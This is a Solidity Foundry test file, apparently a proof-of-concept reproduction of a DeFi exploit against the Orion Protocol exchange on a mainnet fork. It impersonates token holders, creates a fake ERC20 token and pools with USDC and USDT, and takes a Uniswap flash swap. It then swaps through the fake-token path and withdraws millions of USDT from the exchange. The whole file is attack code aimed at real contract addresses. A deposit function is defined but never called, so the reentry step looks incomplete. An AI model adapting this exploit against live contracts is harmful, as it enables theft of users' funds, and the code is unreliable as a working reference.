// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Counter.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

interface UNI{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface USDT{
    function approve(address spender, uint value) external;
    function balanceOf(address _owner) external returns (uint balance);
    function transfer(address _to, uint _value) external;
}
interface USDC{
    function approve(address spender, uint value) external;
    function balanceOf(address _owner) external returns (uint balance);
    function transfer(address _to, uint _value) external;
}
interface ExchangeWithAtomic{
    function depositAsset(address assetAddress, uint112 amount) external;
    function swapThroughOrionPool(
        uint112     amount_spend,
        uint112     amount_receive,
        address[]   calldata path,
        bool        is_exact_spend
    ) external payable;
    function getBalance(address assetAddress, address user)
    external view returns (int192);
    function withdraw(address assetAddress, uint112 amount)
    external;
}
interface OrionPoolV2Pair{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface OrionPoolV2Factory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
//interface tokenA{
//    function approve(address spender, uint value) external;
//    function balanceOf(address _owner) external returns (uint balance);
//    function transfer(address _to, uint _value) external;
//}
interface pair{
    function mint(address to) external returns (uint liquidity);
}
contract CounterTest is Test {

    function setUp() public {

    }
    UNI uni=UNI(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    USDT usdt=USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    USDC usdc=USDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    OrionPoolV2Pair orionpoolv2pair=OrionPoolV2Pair(0x13e557c51C0a37E25E051491037Ee546597c689F);
    ExchangeWithAtomic exchangewithatomic=ExchangeWithAtomic(0xb5599f568D3f3e6113B286d010d2BCa40A7745AA);
    OrionPoolV2Factory orionpoolv2factory=OrionPoolV2Factory(0x5FA0060FcfEa35B31F7A5f6025F0fF399b98Edf1);
    address[] public tokens;
    function testa() public{
        ERC20 fakeA=new ERC20("fakea","fa");
        address pair1=orionpoolv2factory.createPair(address(fakeA),address(usdc));
        address pair2=orionpoolv2factory.createPair(address(fakeA),address(usdt));
        vm.prank(0x0A59649758aa4d66E25f08Dd01271e891fe52199);
        usdc.transfer(address(this),500000);
        vm.prank(0x0A59649758aa4d66E25f08Dd01271e891fe52199);
        usdc.transfer(address(this),1000000);
        vm.prank(0x0A59649758aa4d66E25f08Dd01271e891fe52199);
        usdc.transfer(address(pair1),500000);
        vm.prank(0x5754284f345afc66a98fbB0a0Afe71e0F007B949);
        usdt.transfer(address(pair2),500000);
        vm.prank(0x5754284f345afc66a98fbB0a0Afe71e0F007B949);
        usdt.transfer(address(this),1);
        fakeA.transfer(address(pair1),500000000000000000);
        fakeA.transfer(address(pair2),500000000000000000);
        pair(pair1).mint(address(this));
        pair(pair2).mint(address(this));
        usdt.approve(address(exchangewithatomic),type(uint256).max);
        usdc.approve(address(exchangewithatomic),type(uint256).max);
        usdc.approve(address(orionpoolv2pair),type(uint256).max);
        tokens.push(address(usdc));
        tokens.push(address(fakeA));
        tokens.push(address(usdt));
        exchangewithatomic.depositAsset(address(usdc),500000);
        uni.swap(0,2844766426325,address(this),hex"000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000000000296594ad4d5");
        console2.log(usdt.balanceOf(address(this)));
    }
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
        exchangewithatomic.swapThroughOrionPool(10000,0,tokens,true);
        //uint r1=
        exchangewithatomic.getBalance(address(usdt),address(this));
        uint256 r2=usdt.balanceOf(address(exchangewithatomic));
        exchangewithatomic.withdraw(address(usdt),5689532852749);
        usdt.transfer(address(uni),2853326405542);
    }
    function deposit() public{
        uint r3=usdt.balanceOf(address(this));
        exchangewithatomic.depositAsset(address(usdt),uint112(r3));
    }
}
